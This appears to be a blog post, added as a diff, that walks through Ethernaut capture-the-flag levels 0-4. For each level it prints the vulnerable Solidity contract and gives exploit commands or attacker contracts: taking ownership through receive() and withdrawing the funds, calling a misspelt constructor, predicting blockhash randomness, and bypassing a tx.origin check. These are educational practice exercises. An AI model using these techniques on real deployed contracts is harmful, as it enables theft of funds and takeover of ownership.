@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0 - Hello EthernautThis challenge is to help us to learn how to interact with the console provided by ethernaut. it has several functions including sendTransaction to send a transaction in the networ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0-9 Ethernaut CTF">
+<meta property="og:url" content="http://example.com/2022/11/13/0-9-Ethernaut-CTF/index.html">
+<meta property="og:site_name" content="chandu kona">
+<meta property="og:description" content="0 - Hello EthernautThis challenge is to help us to learn how to interact with the console provided by ethernaut. it has several functions including sendTransaction to send a transaction in the networ">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-11-13T09:07:36.000Z">
+<meta property="article:modified_time" content="2022-12-01T15:16:51.355Z">
+<meta property="article:author" content="Chandu Kona">
+<meta property="article:tag" content="SmartContract">
+<meta property="article:tag" content="ethernaut">
+<meta property="article:tag" content="ethereum">
+<meta property="article:tag" content="solidity">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>0-9 Ethernaut CTF</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/11/15/10-18-Ethernaut-CTF/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/08/16/Trouble-With-Pairs-InCTF-Internationals-2021/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/11/13/0-9-Ethernaut-CTF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&text=0-9 Ethernaut CTF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&title=0-9 Ethernaut CTF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&is_video=false&description=0-9 Ethernaut CTF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=0-9 Ethernaut CTF&body=Check out this article: http://example.com/2022/11/13/0-9-Ethernaut-CTF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&title=0-9 Ethernaut CTF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&title=0-9 Ethernaut CTF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&title=0-9 Ethernaut CTF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&title=0-9 Ethernaut CTF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&name=0-9 Ethernaut CTF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/11/13/0-9-Ethernaut-CTF/&t=0-9 Ethernaut CTF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-Hello-Ethernaut"><span class="toc-number">1.</span> <span class="toc-text">0 - Hello Ethernaut</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Fallback"><span class="toc-number">2.</span> <span class="toc-text">1 - Fallback</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Fallout"><span class="toc-number">3.</span> <span class="toc-text">2 - Fallout</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Coin-Flip"><span class="toc-number">4.</span> <span class="toc-text">3 - Coin Flip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Telephone"><span class="toc-number">5.</span> <span class="toc-text">4 - Telephone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Token"><span class="toc-number">6.</span> <span class="toc-text">5 - Token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-Delegation"><span class="toc-number">7.</span> <span class="toc-text">6 - Delegation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-Force"><span class="toc-number">8.</span> <span class="toc-text">7 - Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-Vault"><span class="toc-number">9.</span> <span class="toc-text">8 - Vault</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-King"><span class="toc-number">10.</span> <span class="toc-text">9 - King</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        0-9 Ethernaut CTF
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Chandu Kona</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-13T09:07:36.000Z" itemprop="datePublished">2022-11-13</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/SmartContract/" rel="tag">SmartContract</a>, <a class="tag-link-link" href="/tags/ethereum/" rel="tag">ethereum</a>, <a class="tag-link-link" href="/tags/ethernaut/" rel="tag">ethernaut</a>, <a class="tag-link-link" href="/tags/solidity/" rel="tag">solidity</a>, <a class="tag-link-link" href="/tags/writeup/" rel="tag">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <hr>
+<h2 id="0-Hello-Ethernaut"><a href="#0-Hello-Ethernaut" class="headerlink" title="0 - Hello Ethernaut"></a>0 - Hello Ethernaut</h2><p>This challenge is to help us to learn how to interact with the console provided by ethernaut. it has several functions including <code>sendTransaction</code> to send a transaction in the network, it also stores few required addresses such as <code>player</code>, <code>level</code>, <code>contract</code> to make the interaction simple for the beginers. solving this challenge is very simple we just need to look the contract’s abi using <code>contract.abi</code> command and tryout all functions of the contract which leads to the last function named <code>password()</code> which is actually a public variable view function and it gives the output <code>ethernaut0</code> which is the password requiered for authenticating the contract using <code>authenticate</code> function : <code>contract.authenticate(&#39;ethernaut0&#39;)</code>.</p>
+<hr>
+<h2 id="1-Fallback"><a href="#1-Fallback" class="headerlink" title="1 - Fallback"></a>1 - Fallback</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Fallback</span> &#123;</span><br><span class="line"></span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">  <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint) public contributions;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">    contributions[msg.<span class="property">sender</span>] = <span class="number">1000</span> * (<span class="number">1</span> ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            msg.<span class="property">sender</span> == owner,</span><br><span class="line">            <span class="string">&quot;caller is not the owner&quot;</span></span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">contribute</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.<span class="property">value</span> &lt; <span class="number">0.001</span> ether);</span><br><span class="line">    contributions[msg.<span class="property">sender</span>] += msg.<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span>(contributions[msg.<span class="property">sender</span>] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getContribution</span>(<span class="params"></span>) public view returns (uint) &#123;</span><br><span class="line">    <span class="keyword">return</span> contributions[msg.<span class="property">sender</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) public onlyOwner &#123;</span><br><span class="line">    owner.<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">receive</span>() external payable &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.<span class="property">value</span> &gt; <span class="number">0</span> &amp;&amp; contributions[msg.<span class="property">sender</span>] &gt; <span class="number">0</span>);</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The goal of this challenge is to become the owner of this given contract and drain out all the funds of the contract. this is possible because of the <code>receive()</code> fucntion makes the sender to be owner. <code>receive()</code> function called when the data of the transaction is empty. so, just by sending an empty transaction calles the <code>recieve()</code> function but the contract check if the transaction has some eth value and the contribution of the sender should be greater than 0, to pass the check we just need to contribute some ethereum and then call the <code>recieve()</code> with some etheruem in the transaction to the contract,this makes us the owner of the contract and using <code>withdraw()</code> funciton we can steal all the funds of the coantract, hence achieved our goal.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>: <span class="title function_">toWei</span>(<span class="string">&quot;0.001&quot;</span>)&#125;)  <span class="comment">// this makes the contribution to be grater than 0.</span></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">value</span>: <span class="title function_">toWei</span>(<span class="string">&quot;0.001&quot;</span>)&#125;) <span class="comment">// this makes us the owner.</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">withdraw</span>() <span class="comment">// steals all the funds.</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="2-Fallout"><a href="#2-Fallout" class="headerlink" title="2 - Fallout"></a>2 - Fallout</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Fallout</span> &#123;</span><br><span class="line">  </span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* constructor */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">Fal1out</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">    allocations[owner] = msg.<span class="property">value</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">         <span class="built_in">require</span>(</span><br><span class="line">             msg.<span class="property">sender</span> == owner,</span><br><span class="line">             <span class="string">&quot;caller is not the owner&quot;</span></span><br><span class="line">         );</span><br><span class="line">         _;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">allocate</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">    allocations[msg.<span class="property">sender</span>] = allocations[msg.<span class="property">sender</span>].<span class="title function_">add</span>(msg.<span class="property">value</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">sendAllocation</span>(<span class="params">address payable allocator</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>(allocations[allocator] &gt; <span class="number">0</span>);</span><br><span class="line">    allocator.<span class="title function_">transfer</span>(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">collectAllocations</span>(<span class="params"></span>) public onlyOwner &#123;</span><br><span class="line">    msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">allocatorBalance</span>(<span class="params">address allocator</span>) public view returns (uint) &#123;</span><br><span class="line">    <span class="keyword">return</span> allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The goal of this challenge is to become the owner of this contract, if you the constructor is misspelt it is not a constructor anymore and a public function that anyone can call, and since that fucntion defines the owner anyone who called that function can become the owner of this contract achieving our goal.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title class_">Fal1</span>out()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="3-Coin-Flip"><a href="#3-Coin-Flip" class="headerlink" title="3 - Coin Flip"></a>3 - Coin Flip</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">CoinFlip</span> &#123;</span><br><span class="line"></span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 <span class="variable constant_">FACTOR</span> = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">flip</span>(<span class="params">bool _guess</span>) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = <span class="title function_">uint256</span>(<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      <span class="title function_">revert</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / <span class="variable constant_">FACTOR</span>;</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Here the <code>consecutiveWins</code> variable is set to 0 in the begin and we have to make it 10 to win this challenge. to do that we need to guess the CoinFlip correctly for 10 times, this is possible since the contract is generating the random number form it’s blockhash of previous block since we all can get the value of the random number, we can calculate the CoinFlip and give it as a guess for 10 time to win this challenge.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">CoinFlip</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">flip</span>(<span class="params">bool _guess</span>) external returns (bool);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="title class_">CoinFlip</span> cf;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 <span class="variable constant_">FACTOR</span> = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _address</span>) &#123;</span><br><span class="line">      cf = <span class="title class_">CoinFlip</span>(_address);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params"></span>) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = <span class="title function_">uint256</span>(<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      <span class="title function_">revert</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / <span class="variable constant_">FACTOR</span>;</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">require</span>(cf.<span class="title function_">flip</span>(side));</span><br><span class="line">    <span class="keyword">return</span> side;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="4-Telephone"><a href="#4-Telephone" class="headerlink" title="4 - Telephone"></a>4 - Telephone</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Telephone</span> &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">changeOwner</span>(<span class="params">address _owner</span>) public &#123;</span><br><span class="line">    <span class="keyword">if</span> (tx.<span class="property">origin</span> != msg.<span class="property">sender</span>) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The goal of this challenge is to become owner using the <code>changeOwner()</code> funciton but there is a check says <code>tx.origin != msg.sender</code> which means the origner of the transaction should not be the same address as the msg.sender, this is possible if we use a smart contract to call the <code>Telephone</code> contract to change the owner.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Telephone</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">changeOwner</span>(<span class="params">address _owner</span>) external;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="title class_">Telephone</span> cf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _address</span>) &#123;</span><br><span class="line">      cf = <span class="title class_">Telephone</span>(_address);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">call_the_phone</span>(<span class="params"></span>) public &#123;</span><br><span class="line">      cf.<span class="title function_">changeOwner</span>(msg.<span class="property">sender</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
